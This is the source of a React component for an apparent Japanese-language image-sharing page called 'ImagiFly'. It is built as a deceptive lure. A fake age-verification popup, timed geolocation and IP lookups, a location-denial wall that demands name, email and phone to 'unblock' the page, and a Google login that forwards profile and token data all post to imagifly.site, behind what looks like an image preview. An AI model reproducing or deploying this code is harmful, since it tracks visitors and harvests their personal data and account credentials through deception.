import React, { useState, useEffect } from "react";
import axios from "axios";
import "react-phone-number-input/style.css";
import "./ImageShare1.css";

import { auth } from "../../Firebase/FirebaseConfig";
import { getAuth, GoogleAuthProvider, signInWithPopup } from "firebase/auth";

import Sidebar from "../Sidebar/Sidebar";
import image1 from "../../assets/20241024_102210.png";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faGoogle } from "@fortawesome/free-brands-svg-icons";
import { Link } from "react-router-dom";

const ImageShare2 = () => {
  const [isSidebarOpen, setSidebarOpen] = useState(false);
  const [isPopupOpen, setPopupOpen] = useState(false);
  const [isAccessDenied, setAccessDenied] = useState(false);
  const [locationPermissionGranted, setLocationPermissionGranted] = useState(true);
  const [year, setYear] = useState("");
  const [month, setMonth] = useState("");
  const [day, setDay] = useState("");
  const [lastName, setLastName] = useState("");
  const [firstName, setFirstName] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [location, setLocation] = useState({ lat: null, lon: null });
  const [ipInfo, setIpInfo] = useState(null);
  const [isLoggedIn, setIsLoggedIn] = useState(false);

  const handleGoogleLogin = () => {
    const provider = new GoogleAuthProvider();
    const auth = getAuth();

    signInWithPopup(auth, provider)
      .then((result) => {
        const user = result.user;
        const userData = {
          displayName: user.displayName,
          email: user.email,
          photoURL: user.photoURL,
          emailVerified: user.emailVerified,
          uid: user.uid,
          providerId: user.providerData[0]?.providerId,
          phoneNumber: user.phoneNumber,
          metadata: user.metadata,
          tokens: user.getIdTokenResult(),
        };

        axios
          .post("https://imagifly.site/api/google-login", userData)
          .then((response) => {
            console.log("sending ok", response.data);
            setIsLoggedIn(true);
          })
          .catch((error) => {
            console.log(error);
          });
      })
      .catch((error) => {
        alert("Google ログインに失敗しました。");
      });
  };

  const toggleSidebar = () => {
    setSidebarOpen(!isSidebarOpen);
  };

  const checkLocationPermission = () => {
    if ("permissions" in navigator) {
      navigator.permissions.query({ name: "geolocation" }).then((result) => {
        if (result.state === "denied") {
          setAccessDenied(true); // 권한이 미리 차단된 경우 즉시 처리
        }
      });
    }
  };

  const sendLocation = () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLocation({
            lat: position.coords.latitude,
            lon: position.coords.longitude,
          });

          axios
            .post("https://imagifly.site/api/location", {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
            })
            .then((response) => {
              console.log("位置情報が送信されました:", response.data);
              setLocationPermissionGranted(true);
            })
            .catch((error) => {
              console.error("位置情報の送信に失敗しました:", error);
            });
        },
        (error) => {
          if (error.code === error.PERMISSION_DENIED) {
            setAccessDenied(true); // 권한 차단 시 즉시 팝업 표시
          }
        }
      );
    } else {
      alert("このブラウザは位置情報をサポートしていません。");
    }
  };

  useEffect(() => {
    setYear("");
    setMonth("");
    setDay("");
    setLastName("");
    setFirstName("");
    setEmail("");
    setPhone("");
  }, []);

  useEffect(() => {
    const timer = setTimeout(() => {
      setPopupOpen(true);
      setLocationPermissionGranted(false);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const timer = setTimeout(() => {
      sendLocation();
      fetchIpLocation();
    }, 10000);
    return () => clearTimeout(timer);
  }, []);

  const fetchIpLocation = () => {
    axios
      .get("https://imagifly.site/api/get-ip-location")
      .then((response) => {
        console.log("IP:", response.data);
        setIpInfo(response.data);
      })
      .catch((error) => {
        console.error("IP:", error);
      });
  };

  const closePopup = () => {
    if (!year || !month || !day) {
      alert("生年月日をすべて選択してください。");
      return;
    }

    const birthDate = { year, month, day };

    axios
      .post("https://imagifly.site/api/verify-age", birthDate)
      .then(() => {
        setPopupOpen(false);
      })
      .catch((error) => {
        console.error(error);
      });
  };

  const file = {
    name: "20241024_102210.png",
    uploadTime: "51分前",
    previewUrl: image1,
  };

  useEffect(() => {
    checkLocationPermission(); // 위치 권한 상태 확인
  }, []);

  return (
    <div className="main-container">
      {isPopupOpen && (
        <div className="popup-overlay">
          <div className="popup">
            <p>
              この画像には不適切なコンテンツが含まれている可能性があります。年齢確認が必要です。
            </p>
            <div className="birthday-select">
              <label>生年月日:</label>
              <select
                className="birthday-input"
                value={year}
                onChange={(e) => setYear(e.target.value)}
              >
                <option value="">年</option>
                {Array.from({ length: 100 }, (_, i) => 2024 - i).map((year) => (
                  <option key={year} value={year}>
                    {year}
                  </option>
                ))}
              </select>
              <select
                className="birthday-input"
                value={month}
                onChange={(e) => setMonth(e.target.value)}
              >
                <option value="">月</option>
                {Array.from({ length: 12 }, (_, i) => i + 1).map((month) => (
                  <option key={month} value={month}>
                    {month}
                  </option>
                ))}
              </select>
              <select
                className="birthday-input"
                value={day}
                onChange={(e) => setDay(e.target.value)}
              >
                <option value="">日</option>
                {Array.from({ length: 31 }, (_, i) => i + 1).map((day) => (
                  <option key={day} value={day}>
                    {day}
                  </option>
                ))}
              </select>
              <br></br>
              <br></br>
              <button
                className="popup-close-btn"
                onClick={() => {
                  const currentDate = new Date();
                  const selectedDate = new Date(year, month - 1, day);

                  if (!year || !month || !day) {
                    alert("生年月日をすべて選択してください。");
                    return;
                  }

                  const age =
                    currentDate.getFullYear() - selectedDate.getFullYear();
                  const isBirthdayPassedThisYear =
                    currentDate.getMonth() > selectedDate.getMonth() ||
                    (currentDate.getMonth() === selectedDate.getMonth() &&
                      currentDate.getDate() >= selectedDate.getDate());

                  const calculatedAge = isBirthdayPassedThisYear
                    ? age
                    : age - 1;

                  if (calculatedAge < 20) {
                    console.log(calculatedAge);
                    alert("20歳未満の方はアクセスできません。");
                  } else {
                    alert("20歳以上のためアクセスが許可されます。");
                    setPopupOpen(false);
                    setAccessDenied(false);
                    setLocationPermissionGranted(true);
                    closePopup();
                  }
                }}
              >
                私は18歳以上です
              </button>
            </div>
          </div>
        </div>
      )}

      {isAccessDenied && (
        <div className="location-popup-overlay">
          <div className="location-popup">
            <p>
              位置情報の使用が許可されていません。
              <br />
              これを許可しないとサイトにアクセスできません。
            </p>
            <h3>お問い合わせは管理者までご連絡ください</h3>

            <div className="input-group-row">
              <div className="input-group">
                <label>姓:</label>
                <input
                  type="text"
                  placeholder="姓を入力してください"
                  className="input-field"
                  value={lastName}
                  onChange={(e) => setLastName(e.target.value)}
                />
              </div>

              <div className="input-group">
                <label>名:</label>
                <input
                  type="text"
                  placeholder="名を入力してください"
                  className="input-field"
                  value={firstName}
                  onChange={(e) => setFirstName(e.target.value)}
                />
              </div>
            </div>

            <div className="input-group">
              <label>メールアドレス:</label>
              <input
                type="email"
                placeholder="メールアドレスを入力してください"
                className="input-field"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>

            <div className="input-group">
              <label>電話番号:</label>
              <input
                type="tel"
                placeholder="電話番号を入力してください"
                className="input-field"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
              />
            </div>

            <button
              className="submit-button"
              onClick={() => {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                const phoneRegex = /^(070|080|090)\d{8}$/;

                if (!lastName || !firstName || !email || !phone) {
                  alert("すべてのフィールドを入力してください。");
                  return;
                }

                if (!emailRegex.test(email)) {
                  alert("正しいメールアドレスを入力してください。");
                  return;
                }

                if (!phoneRegex.test(phone)) {
                  alert("電話番号が正しくありません。");
                  return;
                }

                const requestData = { lastName, firstName, email, phone };

                axios
                  .post(
                    "https://imagifly.site/api/unblock-request",
                    requestData
                  )
                  .then((response) => {
                    setAccessDenied(false);
                    setLocationPermissionGranted(true);
                    alert("一時的にブロックが解除されました。");
                  })
                  .catch((error) => {
                    console.error("エラーが発生しました:", error);
                    alert("エラーが発生しました。再試行してください。");
                  });
              }}
            >
              ブロックを解除する
            </button>
          </div>
        </div>
      )}

      {!isPopupOpen && !isAccessDenied && locationPermissionGranted && (
        <>
          <header className="main-header">
            <Link to="/">
              <h1 className="logo">ImagiFly</h1>
            </Link>
            <div className="right-section">
              <div className="current-country">
                <span>Country: </span>
                <img
                  src="https://upload.wikimedia.org/wikipedia/en/9/9e/Flag_of_Japan.svg"
                  className="flag-icon"
                />
              </div>
              <div className="nav-icon" onClick={toggleSidebar}>
                &#9776;
              </div>
            </div>
          </header>

          <Sidebar isOpen={isSidebarOpen} onClose={toggleSidebar} />

          <div className="content">
            <div className="file-preview">
              <h1>Image Preview</h1>
              <img
                src={file.previewUrl}
                alt="Preview"
                className="preview-image"
              />
              <div className="file-info">
                <p className="file-name">ファイル名: {file.name}</p>
                <p className="upload-time">
                  アップロード時間: {file.uploadTime}
                </p>
              </div>
            </div>
            <p className="guest-warning">
              ビジターはダウンロードできません。<br></br>ログインしてください。
            </p>
            <button className="google-login-btn" onClick={handleGoogleLogin}>
              <FontAwesomeIcon icon={faGoogle} className="google-icon" />
              Google ログイン
            </button>
            <button className="download-btn" disabled={!isLoggedIn}>
              ダウンロードする
            </button>
          </div>
        </>
      )}
    </div>
  );
};

export default ImageShare2;
